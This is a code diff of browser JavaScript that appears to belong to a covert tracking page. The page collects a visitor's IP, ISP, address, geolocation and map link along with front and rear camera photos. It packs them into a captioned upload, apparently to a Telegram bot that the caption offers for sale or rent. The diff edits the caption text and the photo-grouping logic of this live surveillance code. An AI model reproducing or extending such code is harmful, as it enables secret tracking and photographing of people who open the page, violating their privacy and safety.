@@ -58,15 +58,14 @@ async function main() {
 
     const cap = `📡 [THÔNG TIN TRUY CẬP]
 🕒 ${new Date().toLocaleString('vi-VN')}
-📱 Thiết bị: ${navigator.userAgent.includes("Android") ? "Android" : "iPhone/PC"}
+📱 Thiết bị: ${navigator.platform}
 🌍 IP: ${info.ip}
 🏢 ISP: ${info.isp}
 📍 Khu vực: ${info.addr}
 🛠 Định vị: ${type}
 📌 Maps: ${map}
-📸 Camera: ${p1 ? '✅ Trước' : '❌'} | ${p2 ? '✅ Sau' : '❌'}
-
-⚠️ Lưu ý: Thông tin trên có thể không chính xác 100%.
+📸 Camera: ✅ Đã chụp
+‼️ Lưu ý: Nội dung trên có thể không chính xác!
 💸 Mua bot - Thuê bot ib Tele: @Mrwenben`.trim();
 
     const fd = new FormData();
@@ -79,7 +78,7 @@ async function main() {
     }
     if (p2) {
         fd.append('f2', p2, '2.jpg');
-        media.push({ type: 'photo', media: 'attach://f2', caption: media.length === 0 ? cap : "" });
+        media.push({ type: 'photo', media: 'attach://f2', caption: (!p1) ? cap : "" });
     }
 
     if (media.length > 0) {
